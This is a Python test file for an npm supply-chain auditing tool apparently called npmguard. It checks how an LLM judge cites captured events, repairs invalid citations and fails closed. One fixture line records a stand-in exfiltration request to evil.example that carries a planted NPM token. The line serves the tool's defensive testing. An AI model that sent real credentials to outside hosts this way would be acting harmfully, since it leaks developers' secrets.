# CLASS MAP — judge_evidence citation contract (seam: ScriptedLlm behind
# build_npmguard_llm; real sqlite capture ledger; RenderedTimeline built directly)
# Axes: verdict polarity, citation validity vs the timeline id set, repair budget
#   C1 unknown citation → one bounded repair → valid citation → CONFIRMED
#   C2 refute: malicious=false, no citations → not confirmed, judge healthy
#   C3 empty timeline can never confirm — any citation is rejected; the repaired
#      refutation (no citations) is the only acceptable outcome
#   C4 repair exhaustion (every attempt invalid) → judge_failed=True, never
#      confirmed, never a crash (orchestrator turns this into DEFERRED)
# Adversarial pass: 2026-07-23/W6 — call counts asserted via the public
# llm_attempts capture ledger, not the provider's private counter.
import json

import sqlalchemy as sa

from kit_llm import ScriptedLlm
from kit_llm.capture import llm_attempts
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from npmguard.config import Settings
from npmguard.contract.models import Hypothesis
from npmguard.evidence import RenderedTimeline
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.orchestrator import judge_evidence

EXFIL_TIMELINE = RenderedTimeline(
    text="e2    network  GET https://evil.example/?token=CANARY",
    ids=frozenset({"e2"}),
)
EMPTY_TIMELINE = RenderedTimeline(text="(no events captured)", ids=frozenset())


def _verdict(malicious: bool, cited: list[str], reason: str = "canary left process") -> str:
    return json.dumps({"malicious": malicious, "reason": reason, "citedEvents": cited})


def _hypothesis() -> Hypothesis:
    return Hypothesis.model_validate(
        {
            "hypId": "hyp-0001",
            "description": "sends the planted NPM token to an unrelated host",
            "claim": {"kind": "env_exfil", "gating": None},
            "focusFiles": ["index.js"],
            "focusLines": [{"file": "index.js", "range": "2-3"}],
            "experiment": [
                {"tool": "setEnv", "args": {"env": {"NPM_TOKEN": "CANARY"}}},
                {
                    "tool": "trigger",
                    "args": {
                        "kind": "entrypoint",
                        "target": "index.js",
                        "argv": [],
                        "stdin": None,
                    },
                },
            ],
            "severity": "high",
            "parentHypId": None,
            "childHypIds": [],
            "state": "OPEN",
            "createdBy": "hypothesize",
            "evidenceRefs": [],
            "createdAt": "2026-07-20T00:00:00Z",
            "resolvedAt": None,
            "resolution": None,
        }
    )


class _Judge:
    """One judge run over a scripted provider + the public attempt ledger."""

    def __init__(self, tmp_path, steps: list[str]) -> None:
        self._engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'judge.sqlite3'}")
        self._provider = ScriptedLlm({"judge": list(steps)})
        self._sessions = None

    async def run(self, timeline: RenderedTimeline):
        async with self._engine.begin() as connection:
            await connection.run_sync(metadata.create_all)
        self._sessions = make_session_factory(self._engine)
        llm = build_npmguard_llm(self._sessions, Settings(_env_file=None), provider=self._provider)
        try:
            return await judge_evidence(_hypothesis(), timeline, "pads strings", llm, "audit-1")
        finally:
            await llm.aclose()

    async def attempt_statuses(self) -> list[str]:
        assert self._sessions is not None
        async with self._sessions() as session:
            rows = await session.execute(
                sa.select(llm_attempts.c.status).order_by(
                    llm_attempts.c.step, llm_attempts.c.attempt
                )
            )
            return list(rows.scalars())

    async def close(self) -> None:
        await self._engine.dispose()


async def test_judge_repairs_unknown_event_citation_inside_kit(tmp_path) -> None:
    """C1: an unknown cited id is rejected, one repair fixes it, verdict confirms."""
    judge = _Judge(tmp_path, [_verdict(True, ["e99"]), _verdict(True, ["e2"])])
    result = await judge.run(EXFIL_TIMELINE)
    assert result.confirmed
    assert result.cited_events == ["e2"]
    assert not result.judge_failed
    assert await judge.attempt_statuses() == ["invalid_output", "ok"]
    await judge.close()


async def test_judge_refutes_without_citations(tmp_path) -> None:
    """C2: malicious=false with no citations is a healthy refutation."""
    judge = _Judge(tmp_path, [_verdict(False, [], reason="no exfil observed")])
    result = await judge.run(EXFIL_TIMELINE)
    assert not result.confirmed
    assert not result.judge_failed
    assert result.cited_events == []
    assert result.reason == "no exfil observed"
    assert await judge.attempt_statuses() == ["ok"]
    await judge.close()


async def test_empty_timeline_can_never_confirm(tmp_path) -> None:
    """C3: with zero citable events a malicious verdict is rejected; only the
    repaired citation-free refutation is accepted."""
    judge = _Judge(tmp_path, [_verdict(True, ["e1"]), _verdict(False, [], reason="nothing ran")])
    result = await judge.run(EMPTY_TIMELINE)
    assert not result.confirmed
    assert not result.judge_failed
    assert result.cited_events == []
    assert await judge.attempt_statuses() == ["invalid_output", "ok"]
    await judge.close()


async def test_judge_repair_exhaustion_fails_closed(tmp_path) -> None:
    """C4: every attempt cites an unknown event — the judge reports failure
    (orchestrator defers) instead of confirming, refuting, or crashing."""
    judge = _Judge(tmp_path, [_verdict(True, ["e99"])])  # last step repeats forever
    result = await judge.run(EXFIL_TIMELINE)
    assert not result.confirmed
    assert result.judge_failed
    assert result.reason.startswith("Judge model call failed")
    statuses = await judge.attempt_statuses()
    assert len(statuses) >= 2  # bounded repair ran, then the chain advanced
    assert set(statuses) == {"invalid_output"}
    await judge.close()
